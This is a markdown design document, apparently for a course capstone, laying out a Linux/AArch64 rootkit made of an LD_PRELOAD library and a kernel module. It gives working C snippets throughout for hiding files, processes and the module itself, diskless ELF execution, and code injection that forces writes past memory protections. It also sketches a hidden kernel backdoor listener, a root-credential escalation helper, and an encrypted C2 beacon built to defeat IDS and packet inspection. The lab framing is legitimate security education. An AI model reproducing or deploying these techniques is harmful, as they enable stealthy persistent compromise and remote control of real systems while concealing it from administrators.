[capstone mindmap.md](https://github.com/user-attachments/files/26382842/capstone.mindmap.md)
# Capstone Rootkit — Theoretical Design

## Big Picture

The attack chain has four stages:

```
Stage 0: Exploit MERIDIAN (TCP :1337) → userland code execution as unprivileged user
Stage 1: Use vuln_rwx.ko or vuln_rw.ko → escalate to EL1 (kernel privilege)
Stage 2: Deploy rootkit (librootkit.so + rootkit.ko) → persistence, hiding, backdoor
Stage 3: Beacon calls home → C2 server issues commands
```

Two components make up the rootkit and they work together:

|Component|Runs where|Language|Does what|
|---|---|---|---|
|`librootkit.so`|Userland (LD_PRELOAD)|C|Intercepts libc, hides files/procs, diskless exec, encrypted beacon|
|`rootkit.ko`|Kernel (EL1)|C|kretprobe hooks, module self-hiding, code injection, kernel backdoor|

The separation is intentional. Userland hooks are easier to write and sufficient for most concealment. The kernel module is needed for things that userland simply cannot do: filtering `getdents64` results before they reach any process, hiding the module itself from `lsmod`, and injecting code into arbitrary processes from a privileged kernel context.

---

## Part A — Userland Rootkit (`librootkit.so`)

`LD_PRELOAD` causes the dynamic linker to load our `.so` into every new process before any other library. When our library exports a symbol with the same name as a libc function (e.g., `readdir`), calls to that function from the process go to our version first. You call the real function via `dlsym(RTLD_NEXT, "readdir")` — `RTLD_NEXT` means "find the next definition of this symbol in the load order", which is the real libc one.

### Feature 1: File and Process Hiding

`ls`, `find`, Python's `os.listdir`, everything — they all eventually call `readdir()` or `readdir64()`. These functions return one directory entry at a time. You wrap them and silently skip any entry whose name starts with our magic prefix (e.g., `ghost_`):

```c
struct dirent *readdir(DIR *dirp) {
    typeof(readdir) *real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = real(dirp)) != NULL) {
        if (strncmp(entry->d_name, "ghost_", 6) == 0)
            continue;   // invisible — call real readdir again
        return entry;
    }
    return NULL;
}
```

Process hiding is identical. `/proc` is a virtual filesystem, so `ls /proc` goes through `readdir` just like any other directory. If a process has PID 1234 and you've named it `ghost_1234`, the directory entry `/proc/ghost_1234` is filtered before any tool sees it. The process is still running; it just doesn't appear in `ps`, `top`, or `/proc`.

### Feature 2: Diskless ELF Execution

The goal: execute a binary without it ever existing as a file on disk. The mechanism:

1. `memfd_create("", MFD_CLOEXEC)` creates an anonymous, unnamed file that exists only in RAM. It has a file descriptor but no path in the filesystem.
2. `write(fd, elf_bytes, elf_size)` writes the ELF binary bytes directly into that anonymous file.
3. `fexecve(fd, argv, envp)` executes the ELF directly from the file descriptor — no path needed.

The resulting process does appear in `ps`, but its executable path shows as `/proc/self/fd/N` — a number, not a meaningful filename — and there is no backing file to find on disk. This is how you launch the beacon payload: the ELF bytes live in a C array inside `librootkit.so`, and `fexecve` runs them without ever touching the filesystem.

### Feature 3: Self-Concealment (`/proc` filtering)

Even though there's no file on disk, a determined analyst can run `cat /proc/<pid>/maps` and see that `librootkit.so` is loaded. You prevent this by hooking `fopen()` and `open()`. When those functions are called with a path that matches `/proc/self/maps` or `/proc/<pid>/environ`, you intercept the read, strip out any lines that mention `librootkit.so` or our memfd path, and return the sanitized content. Tools like `ldd`, `pmap`, and manual `/proc` inspection get a version of the file that doesn't mention you.

### Feature 4: Encrypted Beacon

The beacon auto-starts the moment `librootkit.so` is loaded into any process, using a GCC constructor attribute:

```c
__attribute__((constructor))
static void beacon_init(void) {
    pthread_t t;
    pthread_create(&t, NULL, beacon_loop, NULL);
    pthread_detach(t);
}
```

Constructors run before `main()`. This means as soon as any process loads the library — whether via `LD_PRELOAD` or injection — a background thread starts and begins trying to reach the C2 server. See the **Encrypted Beacon Payload** section for the full design.

---

## Part B — Kernel Rootkit (`rootkit.ko`)

Loaded as a kernel module, running at EL1. Userland hooks can be bypassed by calling syscalls directly (using `syscall()` in C or raw `svc #0` in assembly). Kernel hooks cannot — every `getdents64` syscall from every process on the system goes through our kretprobe, with no way to skip it from userland.

### Feature 1: Kernel-Level File/Process Hiding (kretprobe)

A kretprobe fires after a function returns. You attach one to `sys_getdents64` (the kernel's implementation of the `getdents64` syscall). After the syscall fills the user buffer with directory entries and returns, our handler gets control. You walk the `linux_dirent64` chain in that buffer and remove hidden entries by adjusting `d_reclen` — making one entry's length field span over the next entry, effectively erasing it from the chain.

```c
static int getdents64_ret_handler(struct kretprobe_instance *ri,
                                   struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = /* saved in entry handler */;
    long ret = regs_return_value(regs);
    // walk dirent chain, unlink matching entries by adjusting d_reclen
    return 0;
}
```

**AArch64 caveat:** kretprobes set up a trampoline frame. The `pt_regs` you receive in the return handler belong to that trampoline, not the original syscall invocation. This means you cannot read the original argument registers (x0–x5) from the return handler's `pt_regs`. You must save them in the entry handler into `ri->data` (per-instance scratch space) and read them back in the return handler.

### Feature 2: Module Self-Hiding

The kernel keeps loaded modules in a doubly-linked list. `lsmod` and `/proc/modules` read this list. You remove ourself from it:

```c
list_del_init(&THIS_MODULE->list);
```

`list_del_init` unlinks the module's list node and reinitializes it to point to itself (safe for later `list_del` calls on an already-unlinked node). After this runs — typically as the last line of our `init_module` — the module is invisible to `lsmod`, `cat /proc/modules`, `cat /sys/module/*`, and `modinfo`. The module code and data are still in kernel memory and fully executing. You're just not on the list.

### Feature 3: Userland Process Code Injection

From the kernel you can write into any process's virtual memory and redirect its execution. The two key kernel functions:

**`access_process_vm`** — copies bytes into (or out of) another process's address space:

```c
access_process_vm(task, target_addr, shellcode, shellcode_len, FOLL_WRITE | FOLL_FORCE);
```

`FOLL_FORCE` bypasses write protection on pages that are marked read-only or executable-only. This is how you write shellcode into a process that has W^X enforcement.

**`task_pt_regs`** — returns a pointer to the saved register state for a task (the registers that will be restored when the task is next scheduled back in):

```c
struct pt_regs *regs = task_pt_regs(task);
regs->pc = (unsigned long)shellcode_addr;
```

On the next scheduling tick, the task resumes with PC pointing at our shellcode.

### Feature 4: Kernel Network Backdoor

A kthread in the kernel opens a TCP socket that bypasses all userland network visibility:

```c
sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &server_sock);
kernel_bind(server_sock, &addr, sizeof(addr));
kernel_listen(server_sock, 5);
while (!kthread_should_stop()) {
    kernel_accept(server_sock, &client_sock, 0);
    // verify 16-byte magic handshake
    // if valid: accept commands (inject PID, hide file, exec shellcode)
}
```

The socket is created in kernel space and is not registered through the normal socket file descriptor table. Userland tools (`ss`, `netstat`, `lsof`) enumerate sockets by reading `/proc/net/tcp` or through the kernel's socket list — a manually managed kernel socket can be excluded from that list, making the listener invisible to those tools while remaining fully functional.

### Feature 5: Privilege Escalation Helper

Either exposed via ioctl before self-hiding, or triggered through the kernel backdoor. Grants root credentials to the calling process:

```c
struct cred *new = prepare_creds();
new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
commit_creds(new);
```

`prepare_creds()` copies the current credential set. `commit_creds()` atomically installs the new credentials for the calling task. After this returns, `getuid()` returns 0.

---

## Beacon + C2

```
librootkit.so (beacon thread)  ──TCP──►  C2 server (Python)
                                              │
                                   issues commands over encrypted channel
                                   EXEC_CMD | INJECT_PID | HIDE_FILE
```

Beacon loop:

1. Connect to hardcoded C2 IP:PORT
2. Send magic handshake + PSK proof
3. Send heartbeat: hostname, kernel version, uid, pid, timestamp
4. Send `TASK_REQ`; block waiting for `TASK_RESP`
5. Execute the task; send `TASK_RESULT`
6. Sleep N seconds, repeat

---

## Encrypted Beacon Payload (Special Feature)

### Why Encrypt

A plaintext beacon is trivially detectable:

- IDS rules match on command strings like `exec`, `inject`, `hide` appearing in TCP streams
- `tcpdump` on the C2 side shows hostnames, credentials, and command results in clear text
- `strings librootkit.so` reveals the C2 IP, port, and protocol details
- Replay attacks: anyone who captures the traffic can retransmit commands

Encrypting with an AEAD cipher solves all of these. The wire traffic looks like random bytes. The auth tag prevents replay and forgery.

### Algorithm: ChaCha20-Poly1305

ChaCha20 is a stream cipher. Poly1305 is a one-time authenticator. Combined as an AEAD (Authenticated Encryption with Associated Data), they give you confidentiality + integrity in one operation.

|Property|Value|
|---|---|
|Key|256-bit (32 bytes)|
|Nonce|96-bit (12 bytes) — must be unique per message|
|Auth tag|128-bit (16 bytes) — appended to ciphertext|
|Security|256-bit for confidentiality, 128-bit for authentication|

Why ChaCha over AES-GCM: AES-GCM requires hardware AES acceleration (AES-NI on x86, AES extensions on AArch64) to be fast. ChaCha20 is fast in pure software on any architecture. For a lab running on QEMU emulating AArch64, ChaCha is the better default. Both are secure; this is a performance and portability choice.

### Key Management

**Option A — Pre-Shared Key (recommended for capstone)**

A 32-byte secret compiled into both `librootkit.so` and the C2 server:

```c
static const uint8_t PSK[32] = {
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
    /* 16 more bytes */
};
```

No key exchange, no round trips, no PKI. The weakness: the key is static and can be extracted from the binary. For a capstone demo this is a known and accepted limitation. Note it in ur writeup.

**Option B — X25519 Ephemeral Diffie-Hellman (stronger)**

The C2 server has a long-term X25519 keypair. Its public key is compiled into the beacon. On every connection:

1. Beacon generates a fresh ephemeral X25519 keypair
2. Beacon sends its ephemeral public key to the server
3. Both sides compute `shared_secret = X25519(their_private, peer_public)`
4. Both derive `session_key = HKDF-SHA256(shared_secret, "beacon-session-key")`

Each session gets a unique key derived from an ephemeral value. Even if the server's long-term key is later compromised, past sessions cannot be decrypted (forward secrecy). This is what TLS 1.3 does.

**Recommendation:** Ship PSK for the demo, document Option B as a future improvement.

### Nonce

Each message needs a unique 12-byte nonce. Two valid approaches:

- **Random**: `getrandom(nonce, 12, 0)` before every `encrypted_send`. Simple. The probability of a collision over the lifetime of a capstone demo is astronomically small.
- **Counter**: A global `uint64_t counter` incremented per message, zero-padded to 12 bytes. Guaranteed unique within a session, but must be reset on reconnect.

Use random nonces. They're simpler and more than safe enough here.

### Wire Format

Every encrypted message on the wire looks like this:

```
[ 1 byte  : version = 0x01          ]
[ 12 bytes: nonce (random)          ]
[ 4 bytes : length of ciphertext+tag, big-endian uint32 ]
[ N bytes : ciphertext              ]
[ 16 bytes: Poly1305 authentication tag ]
```

The receiver reads the nonce and length first, allocates a buffer, reads the ciphertext+tag, then calls `chacha20poly1305_decrypt`. If the tag doesn't verify, the connection is dropped and the data is discarded without being acted on. This prevents any replay or forgery.

### `encrypted_send` / `encrypted_recv`

These are drop-in replacements for raw `send()`/`recv()`. Every place the beacon previously called `send(fd, data, len, 0)` now calls `encrypted_send(fd, PSK, data, len)`:

```c
void encrypted_send(int fd, const uint8_t *key,
                    const void *plaintext, size_t len) {
    uint8_t nonce[12];
    getrandom(nonce, 12, 0);

    size_t ct_len = len + 16;   // ciphertext + tag
    uint8_t *ciphertext = malloc(ct_len);
    chacha20poly1305_encrypt(ciphertext, plaintext, len, nonce, key);

    uint8_t version = 0x01;
    send(fd, &version, 1, MSG_MORE);
    send(fd, nonce, 12, MSG_MORE);
    uint32_t framed_len = htonl(ct_len);
    send(fd, &framed_len, 4, MSG_MORE);
    send(fd, ciphertext, ct_len, 0);
    free(ciphertext);
}

ssize_t encrypted_recv(int fd, const uint8_t *key,
                       void *out, size_t max_out) {
    uint8_t version;
    if (recv_all(fd, &version, 1) < 0) return -1;

    uint8_t nonce[12];
    if (recv_all(fd, nonce, 12) < 0) return -1;

    uint32_t ct_len_net;
    if (recv_all(fd, &ct_len_net, 4) < 0) return -1;
    uint32_t ct_len = ntohl(ct_len_net);

    uint8_t *ciphertext = malloc(ct_len);
    if (recv_all(fd, ciphertext, ct_len) < 0) { free(ciphertext); return -1; }

    int ok = chacha20poly1305_decrypt(out, ciphertext, ct_len, nonce, key);
    free(ciphertext);

    if (!ok) return -1;               // authentication failed
    return (ssize_t)(ct_len - 16);    // plaintext length
}
```

### Message Types

```c
#define MSG_HEARTBEAT   0x01   // beacon → C2: I'm alive, here's my info
#define MSG_TASK_REQ    0x02   // beacon → C2: give me a task
#define MSG_TASK_RESP   0x03   // C2 → beacon: here's our task
#define MSG_TASK_RESULT 0x04   // beacon → C2: task output
```

Heartbeat payload (before encryption):

```
{ type: 0x01, hostname: "aarch64-lab", kernel: "6.6.0",
  uid: 0, pid: 1234, timestamp: 1711843200 }
```

### Crypto Library

Embed **monocypher** directly into `librootkit.so`. It's two files (`monocypher.c`, `monocypher.h`), about 1000 lines of C, no external dependencies, and implements ChaCha20-Poly1305 correctly in constant time. The entire crypto stack becomes part of our `.so` — nothing shows up in `ldd` output. Libsodium is more widely audited but adds a visible shared library dependency.

### Why This is a Strong Special Feature

1. **Authentication built in** — the Poly1305 tag authenticates every message. A forged or replayed command is detected before it's acted on.
2. **Full confidentiality** — hostnames, PIDs, command strings, and results are all encrypted. `tcpdump` sees random bytes.
3. **No IDS signatures** — no plaintext patterns to match against. Traffic is indistinguishable from noise on the wire.
4. **Forward secrecy (with Option B)** — a key compromise doesn't expose past sessions.
5. **Zero link-time dependencies** — monocypher embedded means no `libsodium.so` or `libcrypto.so` in `ldd` output, which would be an obvious red flag.
6. **Correct nonce hygiene** — random per-message nonces prevent nonce reuse, which is the primary failure mode for stream cipher-based AEAD schemes.

---

## Implementation Order

1. `librootkit.so` skeleton — `dlsym` wrappers build and load without crashing
2. `readdir` hiding — test with `ls /proc`, look for filtered entries
3. `/proc/self/maps` filtering — test with `cat /proc/self/maps` from within a preloaded process
4. Beacon loop — plaintext TCP first, confirm C2 connectivity end-to-end
5. Add monocypher — replace `send`/`recv` with `encrypted_send`/`encrypted_recv`, update C2 server to decrypt
6. `rootkit.ko` — kretprobe on `getdents64`, module self-hide with `list_del_init`
7. Injection + privesc — tie to kernel backdoor handshake
8. Full integration test — exploit → load → beacon → C2 issues command → result comes back encrypted

---

## What You Still Need from the Instructor

- `MERIDIAN` binary (TCP server on :1337, `submit` command has the mmap RWX bug)
- `vuln_rwx.ko` (JIT engine driver — `module_alloc` + copy user code + call it at EL1)
- `vuln_rw.ko` (arbitrary kernel read/write via `KREAD`/`KWRITE` ioctls)
- `setup_capstone.sh` (loads the above drivers, starts MERIDIAN at boot)

Also needed in [scripts/start.sh](vscode-webview://0o53evmk4clop05fg11gjcsjc1vu6u5e74uphke19ejh2ma1lfc5/scripts/start.sh): add `hostfwd=tcp::11337-:1337` — currently only SSH port 22 is forwarded.
